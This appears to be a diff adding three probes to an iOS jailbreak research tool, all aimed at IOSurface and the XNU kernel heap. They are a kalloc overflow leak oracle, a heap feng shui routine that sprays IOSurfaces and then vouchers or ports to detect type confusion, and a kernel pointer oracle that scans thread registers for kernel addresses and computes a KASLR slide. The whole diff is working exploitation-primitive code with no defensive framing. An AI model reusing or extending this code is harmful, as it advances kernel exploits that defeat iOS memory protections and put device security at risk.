@@ -25938,6 +25938,552 @@ void iosurface_pac_harvest(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done)
     });
 }
 
+#pragma mark - Probe JB17: Kalloc Overflow Oracle
+
+void iosurface_kalloc_overflow(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        log(@"[JB17] ========================================");
+        log(@"[JB17] Kalloc Overflow Oracle");
+        log(@"[JB17] IOSurface property sizes at kalloc boundaries + leak scan");
+        log(@"[JB17] ========================================");
+
+        int leakedBytes = 0;
+        int nonZeroTrailing = 0;
+        int kernPtrFound = 0;
+        uint64_t bestKernPtr = 0;
+
+        ISRSymbols sym;
+        if (!isr_load(&sym)) {
+            log(@"[JB17] Failed to load IOSurface symbols");
+            done(@{@"error": @"load_failed"});
+            return;
+        }
+
+        typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
+        SetValueFn setVal = (SetValueFn)dlsym(RTLD_DEFAULT, "IOSurfaceSetValue");
+        typedef CFTypeRef (*CopyValueFn)(IOSurfaceRef, CFStringRef);
+        CopyValueFn copyVal = (CopyValueFn)dlsym(RTLD_DEFAULT, "IOSurfaceCopyValue");
+
+        if (!setVal || !copyVal) {
+            log(@"[JB17] SetValue or CopyValue not available");
+            isr_unload(&sym);
+            done(@{@"error": @"no_property_funcs"});
+            return;
+        }
+
+        int kallocSizes[] = {16, 32, 48, 64, 80, 96, 128, 160, 192, 256, 384, 512, 768, 1024, 2048, 4096};
+        int numSizes = sizeof(kallocSizes) / sizeof(kallocSizes[0]);
+
+        if (!isr_stopped()) {
+            log(@"[JB17] --- Paso 1: Create surfaces and set properties at kalloc boundaries ---");
+
+            for (int si = 0; si < numSizes && !isr_stopped(); si++) {
+                int sz = kallocSizes[si];
+                NSDictionary *props = @{
+                    @"IOSurfaceWidth": @(32),
+                    @"IOSurfaceHeight": @(32),
+                    @"IOSurfaceBytesPerElement": @(4),
+                    @"IOSurfacePixelFormat": @(0x42475241)
+                };
+                IOSurfaceRef surf = sym.create((__bridge CFDictionaryRef)props);
+                if (!surf) continue;
+
+                NSMutableData *writeData = [NSMutableData dataWithLength:sz];
+                uint8_t *wBytes = (uint8_t *)writeData.mutableBytes;
+                for (int i = 0; i < sz; i++) wBytes[i] = (uint8_t)(0xA0 + (si & 0x0F));
+
+                CFStringRef key = (__bridge CFStringRef)[NSString stringWithFormat:@"jb17_k%d", sz];
+                setVal(surf, key, (__bridge CFTypeRef)writeData);
+
+                CFTypeRef readBack = copyVal(surf, key);
+                if (readBack) {
+                    if (CFGetTypeID(readBack) == CFDataGetTypeID()) {
+                        CFDataRef rData = (CFDataRef)readBack;
+                        CFIndex rLen = CFDataGetLength(rData);
+                        const uint8_t *rBytes = CFDataGetBytePtr(rData);
+
+                        if (rLen > sz) {
+                            int extra = (int)(rLen - sz);
+                            leakedBytes += extra;
+                            log([NSString stringWithFormat:@"[JB17] OVERFLOW kalloc.%d: wrote %d read %d (+%d bytes leaked!)",
+                                 sz, sz, (int)rLen, extra]);
+
+                            for (CFIndex off = sz; off + 8 <= rLen; off += 4) {
+                                uint64_t v = 0;
+                                memcpy(&v, rBytes + off, 8);
+                                if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL && v != 0xFFFFFFFFFFFFFFFFULL) {
+                                    kernPtrFound++;
+                                    log([NSString stringWithFormat:@"[JB17] KERN_PTR in overflow at offset %d: 0x%llx",
+                                         (int)off, (unsigned long long)v]);
+                                    if (bestKernPtr == 0) bestKernPtr = v;
+                                }
+                            }
+                        }
+
+                        if (rLen >= sz) {
+                            for (CFIndex off = sz - 8; off + 8 <= rLen && off >= 0; off += 4) {
+                                uint64_t v = 0;
+                                memcpy(&v, rBytes + off, 8);
+                                if (v != 0 && (v & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL && v != 0xFFFFFFFFFFFFFFFFULL) {
+                                    kernPtrFound++;
+                                    log([NSString stringWithFormat:@"[JB17] KERN_PTR in trailing at offset %d: 0x%llx",
+                                         (int)off, (unsigned long long)v]);
+                                    if (bestKernPtr == 0) bestKernPtr = v;
+                                }
+                            }
+
+                            int trailing = 0;
+                            for (CFIndex i = rLen - 1; i >= (CFIndex)sz - 16 && i >= 0; i--) {
+                                if (rBytes[i] != wBytes[i % sz]) trailing++;
+                            }
+                            if (trailing > 0) {
+                                nonZeroTrailing += trailing;
+                                log([NSString stringWithFormat:@"[JB17] kalloc.%d: %d modified trailing bytes", sz, trailing]);
+                            }
+                        }
+                    }
+                    CFRelease(readBack);
+                }
+                CFRelease(surf);
+            }
+        }
+
+        if (!isr_stopped()) {
+            log(@"[JB17] --- Paso 2: Rapid alloc/free cycle at kalloc.256 boundary ---");
+            for (int round = 0; round < 8 && !isr_stopped(); round++) {
+                IOSurfaceRef *batch = (IOSurfaceRef *)calloc(32, sizeof(IOSurfaceRef));
+                if (!batch) break;
+
+                for (int i = 0; i < 32; i++) {
+                    NSDictionary *p = @{@"IOSurfaceWidth":@(32),@"IOSurfaceHeight":@(32),@"IOSurfaceBytesPerElement":@(4),@"IOSurfacePixelFormat":@(0x42475241)};
+                    batch[i] = sym.create((__bridge CFDictionaryRef)p);
+                    if (batch[i]) {
+                        NSMutableData *d = [NSMutableData dataWithLength:256];
+                        memset(d.mutableBytes, 0xCC, 256);
+                        CFStringRef k = (__bridge CFStringRef)[NSString stringWithFormat:@"jb17_r%d_%d", round, i];
+                        setVal(batch[i], k, (__bridge CFTypeRef)d);
+                    }
+                }
+
+                for (int i = 0; i < 16; i++) {
+                    if (batch[i]) { CFRelease(batch[i]); batch[i] = NULL; }
+                }
+
+                typedef kern_return_t (*ZoneForceGCFn)(host_t);
+                ZoneForceGCFn forceGC = (ZoneForceGCFn)dlsym(RTLD_DEFAULT, "mach_zone_force_gc");
+                if (forceGC) forceGC(mach_host_self());
+
+                for (int i = 16; i < 32 && !isr_stopped(); i++) {
+                    if (!batch[i]) continue;
+                    CFStringRef k = (__bridge CFStringRef)[NSString stringWithFormat:@"jb17_r%d_%d", round, i];
+                    CFTypeRef rb = copyVal(batch[i], k);
+                    if (rb) {
+                        if (CFGetTypeID(rb) == CFDataGetTypeID()) {
+                            CFDataRef rd = (CFDataRef)rb;
+                            const uint8_t *rp = CFDataGetBytePtr(rd);
+                            CFIndex rl = CFDataGetLength(rd);
+                            int corrupted = 0;
+                            for (CFIndex b = 0; b < rl; b++) {
+                                if (rp[b] != 0xCC) corrupted++;
+                            }
+                            if (corrupted > 0) {
+                                log([NSString stringWithFormat:@"[JB17] CORRUPTION round%d surf%d: %d/%d bytes changed!", round, i, corrupted, (int)rl]);
+                                for (CFIndex off = 0; off + 8 <= rl; off += 4) {
+                                    uint64_t v = 0;
+                                    memcpy(&v, rp + off, 8);
+                                    if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL && v != 0xFFFFFFFFFFFFFFFFULL) {
+                                        kernPtrFound++;
+                                        log([NSString stringWithFormat:@"[JB17] KERN_PTR_CORRUPT offset %d: 0x%llx", (int)off, (unsigned long long)v]);
+                                        if (bestKernPtr == 0) bestKernPtr = v;
+                                    }
+                                }
+                            }
+                        }
+                        CFRelease(rb);
+                    }
+                    CFRelease(batch[i]);
+                }
+                free(batch);
+            }
+        }
+
+        isr_unload(&sym);
+
+        log(@"[JB17] ========================================");
+        log([NSString stringWithFormat:@"[JB17] RESULTADO: leakedBytes=%d nonZeroTrailing=%d kernPtrs=%d bestPtr=0x%llx",
+             leakedBytes, nonZeroTrailing, kernPtrFound, (unsigned long long)bestKernPtr]);
+        log(@"[JB17] ========================================");
+
+        done(@{
+            @"leakedBytes": @(leakedBytes),
+            @"nonZeroTrailing": @(nonZeroTrailing),
+            @"kernelPtrsFound": @(kernPtrFound),
+            @"bestKernelPtr": [NSString stringWithFormat:@"0x%llx", (unsigned long long)bestKernPtr]
+        });
+    });
+}
+
+#pragma mark - Probe JB18: Heap Feng Shui + Type Confusion
+
+void iosurface_heap_fengshui(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        log(@"[JB18] ========================================");
+        log(@"[JB18] Heap Feng Shui + Type Confusion");
+        log(@"[JB18] IOSurface+voucher cross-zone spray for type confusion");
+        log(@"[JB18] ========================================");
+
+        int voucherCount = 0;
+        int surfCount = 0;
+        int confusionDetected = 0;
+        int kernPtrsFound = 0;
+        uint64_t bestKernPtr = 0;
+
+        ISRSymbols sym;
+        if (!isr_load(&sym)) {
+            done(@{@"error": @"load_failed"});
+            return;
+        }
+
+        typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
+        SetValueFn setVal = (SetValueFn)dlsym(RTLD_DEFAULT, "IOSurfaceSetValue");
+        typedef CFTypeRef (*CopyValueFn)(IOSurfaceRef, CFStringRef);
+        CopyValueFn copyVal = (CopyValueFn)dlsym(RTLD_DEFAULT, "IOSurfaceCopyValue");
+        typedef kern_return_t (*HostCreateVoucherFn)(host_t, mach_voucher_attr_raw_recipe_array_t,
+                                                      mach_msg_type_number_t, mach_port_t *);
+        HostCreateVoucherFn createVoucher = (HostCreateVoucherFn)dlsym(RTLD_DEFAULT, "host_create_mach_voucher");
+
+        if (!setVal || !copyVal) {
+            isr_unload(&sym);
+            done(@{@"error": @"no_funcs"});
+            return;
+        }
+
+        if (!isr_stopped()) {
+            log(@"[JB18] --- Paso 1: Spray 128 IOSurfaces (kalloc.4096 zone) ---");
+            IOSurfaceRef *surfs = (IOSurfaceRef *)calloc(128, sizeof(IOSurfaceRef));
+            if (!surfs) { isr_unload(&sym); done(@{@"error":@"oom"}); return; }
+
+            for (int i = 0; i < 128 && !isr_stopped(); i++) {
+                NSDictionary *p = @{@"IOSurfaceWidth":@(64),@"IOSurfaceHeight":@(64),@"IOSurfaceBytesPerElement":@(4),@"IOSurfacePixelFormat":@(0x42475241)};
+                surfs[i] = sym.create((__bridge CFDictionaryRef)p);
+                if (surfs[i]) {
+                    surfCount++;
+                    NSMutableData *marker = [NSMutableData dataWithLength:512];
+                    uint8_t *mb = (uint8_t *)marker.mutableBytes;
+                    memset(mb, 0xDD, 512);
+                    mb[0] = 0x4A; mb[1] = 0x42; mb[2] = 0x31; mb[3] = 0x38;
+                    uint32_t idx = (uint32_t)i;
+                    memcpy(mb + 4, &idx, 4);
+                    CFStringRef key = (__bridge CFStringRef)[NSString stringWithFormat:@"jb18_m_%d", i];
+                    setVal(surfs[i], key, (__bridge CFTypeRef)marker);
+                }
+            }
+            log([NSString stringWithFormat:@"[JB18] Sprayed %d surfaces", surfCount]);
+
+            if (!isr_stopped()) {
+                log(@"[JB18] --- Paso 2: Free alternating surfaces (create holes) ---");
+                for (int i = 0; i < 128; i += 2) {
+                    if (surfs[i]) { CFRelease(surfs[i]); surfs[i] = NULL; }
+                }
+
+                typedef kern_return_t (*ZoneForceGCFn)(host_t);
+                ZoneForceGCFn forceGC = (ZoneForceGCFn)dlsym(RTLD_DEFAULT, "mach_zone_force_gc");
+                if (forceGC) forceGC(mach_host_self());
+                usleep(10000);
+
+                log(@"[JB18] --- Paso 3: Fill holes with vouchers ---");
+                mach_port_t *vouchers = (mach_port_t *)calloc(1024, sizeof(mach_port_t));
+                if (createVoucher && vouchers) {
+                    struct { uint32_t key; uint32_t command; uint32_t previous_voucher; uint32_t content_size; } recipe;
+                    recipe.key = 7;
+                    recipe.command = 1;
+                    recipe.previous_voucher = 0;
+                    recipe.content_size = 0;
+                    for (int i = 0; i < 1024 && !isr_stopped(); i++) {
+                        kern_return_t kr = createVoucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&recipe,
+                                                         sizeof(recipe), &vouchers[i]);
+                        if (kr == KERN_SUCCESS) voucherCount++;
+                        else break;
+                    }
+                    log([NSString stringWithFormat:@"[JB18] Sprayed %d vouchers into holes", voucherCount]);
+                } else {
+                    log(@"[JB18] Voucher spray unavailable — using port spray instead");
+                    if (vouchers) {
+                        for (int i = 0; i < 1024 && !isr_stopped(); i++) {
+                            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &vouchers[i]);
+                            if (vouchers[i] != MACH_PORT_NULL) voucherCount++;
+                            else break;
+                        }
+                        log([NSString stringWithFormat:@"[JB18] Sprayed %d ports into holes", voucherCount]);
+                    }
+                }
+
+                if (!isr_stopped()) {
+                    log(@"[JB18] --- Paso 4: Read surviving surfaces — check for type confusion ---");
+                    for (int i = 1; i < 128 && !isr_stopped(); i += 2) {
+                        if (!surfs[i]) continue;
+                        CFStringRef key = (__bridge CFStringRef)[NSString stringWithFormat:@"jb18_m_%d", i];
+                        CFTypeRef rb = copyVal(surfs[i], key);
+                        if (rb) {
+                            if (CFGetTypeID(rb) == CFDataGetTypeID()) {
+                                CFDataRef rd = (CFDataRef)rb;
+                                const uint8_t *rp = CFDataGetBytePtr(rd);
+                                CFIndex rl = CFDataGetLength(rd);
+
+                                BOOL markerIntact = (rl >= 8 && rp[0] == 0x4A && rp[1] == 0x42 && rp[2] == 0x31 && rp[3] == 0x38);
+                                int changed = 0;
+                                for (CFIndex b = 8; b < rl; b++) {
+                                    if (rp[b] != 0xDD) changed++;
+                                }
+                                if (!markerIntact || changed > 0) {
+                                    confusionDetected++;
+                                    log([NSString stringWithFormat:@"[JB18] TYPE_CONFUSION surf[%d]: marker=%s changed=%d/%d",
+                                         i, markerIntact ? "ok" : "CORRUPTED", changed, (int)(rl - 8)]);
+
+                                    for (CFIndex off = 0; off + 8 <= rl; off += 4) {
+                                        uint64_t v = 0;
+                                        memcpy(&v, rp + off, 8);
+                                        if (v != 0 && v != 0xDDDDDDDDDDDDDDDDULL) {
+                                            if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL && v != 0xFFFFFFFFFFFFFFFFULL) {
+                                                kernPtrsFound++;
+                                                log([NSString stringWithFormat:@"[JB18] KERN_PTR off%d: 0x%llx", (int)off, (unsigned long long)v]);
+                                                if (bestKernPtr == 0) bestKernPtr = v;
+                                            }
+                                        }
+                                    }
+
+                                    if (rl >= 32 && !isr_stopped()) {
+                                        NSMutableString *hex = [NSMutableString string];
+                                        int dumpLen = rl < 64 ? (int)rl : 64;
+                                        for (int b = 0; b < dumpLen; b++) [hex appendFormat:@"%02x", rp[b]];
+                                        log([NSString stringWithFormat:@"[JB18] HEX[%d]: %@", i, hex]);
+                                    }
+                                }
+                            }
+                            CFRelease(rb);
+                        }
+                    }
+                }
+
+                if (vouchers) {
+                    for (int i = 0; i < voucherCount; i++) {
+                        if (vouchers[i] != MACH_PORT_NULL)
+                            mach_port_deallocate(mach_task_self(), vouchers[i]);
+                    }
+                    free(vouchers);
+                }
+            }
+
+            for (int i = 0; i < 128; i++) {
+                if (surfs[i]) CFRelease(surfs[i]);
+            }
+            free(surfs);
+        }
+
+        isr_unload(&sym);
+
+        log(@"[JB18] ========================================");
+        log([NSString stringWithFormat:@"[JB18] RESULTADO: surfs=%d vouchers=%d confusion=%d kernPtrs=%d bestPtr=0x%llx",
+             surfCount, voucherCount, confusionDetected, kernPtrsFound, (unsigned long long)bestKernPtr]);
+        log(@"[JB18] ========================================");
+
+        done(@{
+            @"surfacesCreated": @(surfCount),
+            @"vouchersCreated": @(voucherCount),
+            @"confusionDetected": @(confusionDetected),
+            @"kernelPtrsFound": @(kernPtrsFound),
+            @"bestKernelPtr": [NSString stringWithFormat:@"0x%llx", (unsigned long long)bestKernPtr]
+        });
+    });
+}
+
+#pragma mark - Probe JB19: Kernel Pointer Oracle
+
+void iosurface_kptr_oracle(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        log(@"[JB19] ========================================");
+        log(@"[JB19] Kernel Pointer Oracle");
+        log(@"[JB19] Leaked PAC ptr + IOSurface ID correlation + offset calc");
+        log(@"[JB19] ========================================");
+
+        uint64_t leakedKernPtr = 0;
+        int surfaceIDMin = INT_MAX;
+        int surfaceIDMax = 0;
+        int totalSurfaces = 0;
+        uint64_t kaslrSlide = 0;
+        int kernTextPtrs = 0;
+
+        if (!isr_stopped()) {
+            log(@"[JB19] --- Paso 1: Harvest PAC kernel pointer from thread registers ---");
+            volatile int jb19_run = 1;
+            pthread_t wt[4];
+            for (int i = 0; i < 4; i++) {
+                pthread_create(&wt[i], NULL, jb16_mach_worker, NULL);
+            }
+            g_jb16_running = 1;
+            usleep(30000);
+
+            for (int scan = 0; scan < 5 && !isr_stopped() && leakedKernPtr == 0; scan++) {
+                thread_act_array_t threads = NULL;
+                mach_msg_type_number_t threadCount = 0;
+                kern_return_t kr = task_threads(mach_task_self(), &threads, &threadCount);
+                if (kr != KERN_SUCCESS || !threads) continue;
+
+                for (uint32_t t = 0; t < threadCount; t++) {
+                    arm_thread_state64_t state;
+                    mach_msg_type_number_t cnt = ARM_THREAD_STATE64_COUNT;
+                    kr = thread_get_state(threads[t], ARM_THREAD_STATE64, (thread_state_t)&state, &cnt);
+                    if (kr != KERN_SUCCESS) { mach_port_deallocate(mach_task_self(), threads[t]); continue; }
+
+                    for (int r = 0; r < 29; r++) {
+                        uint64_t v = state.__x[r];
+                        if (v == 0) continue;
+                        uint64_t top = (v >> 48) & 0xFFFF;
+                        if (top == 0 || top == 0xFFFF) continue;
+                        uint64_t stripped = (v >> 47) & 1 ? (v | 0xFFFF000000000000ULL) : (v & 0x0000FFFFFFFFFFFFULL);
+                        if (stripped >= 0xFFFFFFF000000000ULL && stripped != 0xFFFFFFFFFFFFFFFFULL) {
+                            leakedKernPtr = stripped;
+                            log([NSString stringWithFormat:@"[JB19] Leaked kernel ptr: 0x%llx (raw=0x%llx PAC=0x%04llx reg=x%d)",
+                                 (unsigned long long)stripped, (unsigned long long)v, (unsigned long long)top, r]);
+                            break;
+                        }
+                    }
+                    mach_port_deallocate(mach_task_self(), threads[t]);
+                    if (leakedKernPtr != 0) break;
+                }
+                vm_deallocate(mach_task_self(), (vm_address_t)threads, threadCount * sizeof(thread_act_t));
+                usleep(20000);
+            }
+
+            g_jb16_running = 0;
+            usleep(10000);
+            for (int i = 0; i < 4; i++) pthread_join(wt[i], NULL);
+
+            if (leakedKernPtr == 0) {
+                log(@"[JB19] No kernel pointer found in registers this run");
+            }
+        }
+
+        ISRSymbols sym;
+        if (!isr_load(&sym)) {
+            done(@{@"error": @"load_failed"});
+            return;
+        }
+
+        if (!isr_stopped()) {
+            log(@"[JB19] --- Paso 2: Create IOSurfaces and track IDs ---");
+            IOSurfaceRef *surfs = (IOSurfaceRef *)calloc(256, sizeof(IOSurfaceRef));
+            uint32_t *ids = (uint32_t *)calloc(256, sizeof(uint32_t));
+            if (surfs && ids) {
+                for (int i = 0; i < 256 && !isr_stopped(); i++) {
+                    NSDictionary *p = @{@"IOSurfaceWidth":@(32),@"IOSurfaceHeight":@(32),@"IOSurfaceBytesPerElement":@(4),@"IOSurfacePixelFormat":@(0x42475241)};
+                    surfs[i] = sym.create((__bridge CFDictionaryRef)p);
+                    if (surfs[i]) {
+                        ids[i] = sym.getID(surfs[i]);
+                        totalSurfaces++;
+                        if ((int)ids[i] < surfaceIDMin) surfaceIDMin = (int)ids[i];
+                        if ((int)ids[i] > surfaceIDMax) surfaceIDMax = (int)ids[i];
+                    }
+                }
+                log([NSString stringWithFormat:@"[JB19] Created %d surfaces, IDs range [%d-%d]", totalSurfaces, surfaceIDMin, surfaceIDMax]);
+
+                if (totalSurfaces > 1 && !isr_stopped()) {
+                    int idSpread = surfaceIDMax - surfaceIDMin;
+                    log([NSString stringWithFormat:@"[JB19] ID spread: %d (sequential=%s)", idSpread,
+                         idSpread == totalSurfaces - 1 ? "YES" : "NO"]);
+
+                    if (leakedKernPtr != 0) {
+                        log(@"[JB19] --- Paso 3: Correlate kernel ptr with IOSurface layout ---");
+                        uint64_t ptrPage = leakedKernPtr & ~0xFFFULL;
+                        uint64_t ptrOff = leakedKernPtr & 0xFFF;
+                        log([NSString stringWithFormat:@"[JB19] Kernel ptr page: 0x%llx offset: 0x%llx",
+                             (unsigned long long)ptrPage, (unsigned long long)ptrOff]);
+
+                        log([NSString stringWithFormat:@"[JB19] Per-surface kernel alloc ~3584 bytes (from JB14)"]);
+                        log([NSString stringWithFormat:@"[JB19] Estimated kernel surface array base: 0x%llx - (%d * 3584) = 0x%llx",
+                             (unsigned long long)leakedKernPtr, surfaceIDMin,
+                             (unsigned long long)(leakedKernPtr - (uint64_t)surfaceIDMin * 3584ULL)]);
+
+                        uint64_t knownStructs[] = {
+                            0xFFFFFFF007004000ULL,
+                            0xFFFFFFF007008000ULL,
+                            0xFFFFFFF00700C000ULL,
+                            0xFFFFFFF007010000ULL,
+                        };
+                        int numKnown = 4;
+                        for (int k = 0; k < numKnown; k++) {
+                            int64_t diff = (int64_t)(leakedKernPtr - knownStructs[k]);
+                            log([NSString stringWithFormat:@"[JB19] Offset from kernbase+0x%llx: %+lld (0x%llx)",
+                                 (unsigned long long)(knownStructs[k] - 0xFFFFFFF007004000ULL),
+                                 (long long)diff, (unsigned long long)(uint64_t)diff]);
+                        }
+                    }
+                }
+
+                if (!isr_stopped()) {
+                    log(@"[JB19] --- Paso 4: Thread register scan during surface operations ---");
+                    for (int i = 0; i < 128 && !isr_stopped(); i += 2) {
+                        if (surfs[i]) { CFRelease(surfs[i]); surfs[i] = NULL; }
+                    }
+                    usleep(5000);
+
+                    thread_act_array_t threads = NULL;
+                    mach_msg_type_number_t threadCount = 0;
+                    kern_return_t kr = task_threads(mach_task_self(), &threads, &threadCount);
+                    if (kr == KERN_SUCCESS && threads) {
+                        for (uint32_t t = 0; t < threadCount && !isr_stopped(); t++) {
+                            arm_thread_state64_t state;
+                            mach_msg_type_number_t cnt = ARM_THREAD_STATE64_COUNT;
+                            kr = thread_get_state(threads[t], ARM_THREAD_STATE64, (thread_state_t)&state, &cnt);
+                            if (kr != KERN_SUCCESS) { mach_port_deallocate(mach_task_self(), threads[t]); continue; }
+
+                            for (int r = 0; r < 29; r++) {
+                                uint64_t v = state.__x[r];
+                                if (v == 0) continue;
+                                uint64_t stripped = (v >> 47) & 1 ? (v | 0xFFFF000000000000ULL) : (v & 0x0000FFFFFFFFFFFFULL);
+                                if (stripped >= 0xFFFFFFF000000000ULL && stripped < 0xFFFFFFF800000000ULL && stripped != 0xFFFFFFFFFFFFFFFFULL) {
+                                    kernTextPtrs++;
+                                    kaslrSlide = stripped - 0xFFFFFFF007004000ULL;
+                                    log([NSString stringWithFormat:@"[JB19] KERN_TEXT t[%u] r[%d] raw=0x%llx -> 0x%llx SLIDE=0x%llx",
+                                         t, r, (unsigned long long)v, (unsigned long long)stripped, (unsigned long long)kaslrSlide]);
+                                }
+                            }
+                            mach_port_deallocate(mach_task_self(), threads[t]);
+                        }
+                        vm_deallocate(mach_task_self(), (vm_address_t)threads, threadCount * sizeof(thread_act_t));
+                    }
+                }
+
+                for (int i = 0; i < 256; i++) {
+                    if (surfs[i]) CFRelease(surfs[i]);
+                }
+            }
+            if (surfs) free(surfs);
+            if (ids) free(ids);
+        }
+
+        isr_unload(&sym);
+
+        log(@"[JB19] ========================================");
+        log([NSString stringWithFormat:@"[JB19] RESULTADO: leakedPtr=0x%llx surfaces=%d IDrange=[%d-%d] kernText=%d slide=0x%llx",
+             (unsigned long long)leakedKernPtr, totalSurfaces, surfaceIDMin, surfaceIDMax,
+             kernTextPtrs, (unsigned long long)kaslrSlide]);
+        log(@"[JB19] ========================================");
+
+        done(@{
+            @"leakedKernelPtr": [NSString stringWithFormat:@"0x%llx", (unsigned long long)leakedKernPtr],
+            @"totalSurfaces": @(totalSurfaces),
+            @"surfaceIDMin": @(surfaceIDMin),
+            @"surfaceIDMax": @(surfaceIDMax),
+            @"kernelTextPtrs": @(kernTextPtrs),
+            @"kaslrSlide": [NSString stringWithFormat:@"0x%llx", (unsigned long long)kaslrSlide]
+        });
+    });
+}
+
 #pragma mark - Probe 99: Surface Lifecycle TOCTOU Race
 
 static volatile sig_atomic_t g_lifecycle_segv_count = 0;
